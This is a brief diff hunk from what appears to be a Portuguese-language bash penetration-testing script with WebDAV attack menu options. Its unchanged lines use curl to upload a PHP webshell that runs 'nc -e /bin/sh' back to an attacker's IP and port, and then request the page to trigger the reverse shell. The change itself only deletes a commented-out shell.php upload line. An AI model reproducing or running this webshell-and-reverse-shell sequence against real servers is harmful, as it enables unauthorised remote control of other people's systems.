@@ -980,7 +980,7 @@ do
                       echo
                       curl -s -X PUT -d "<?php%20system('nc -e /bin/sh $ipreverso $porta');?>" http://$ip/webshell.php
                       curl -s -X GET http://$ip/webshell.php
-                     # curl -v http://172.16.1.10/webdav/ --upload-file shell.php   
+                       
             ;;
             
             "3") # Testar WebDav - davtest  
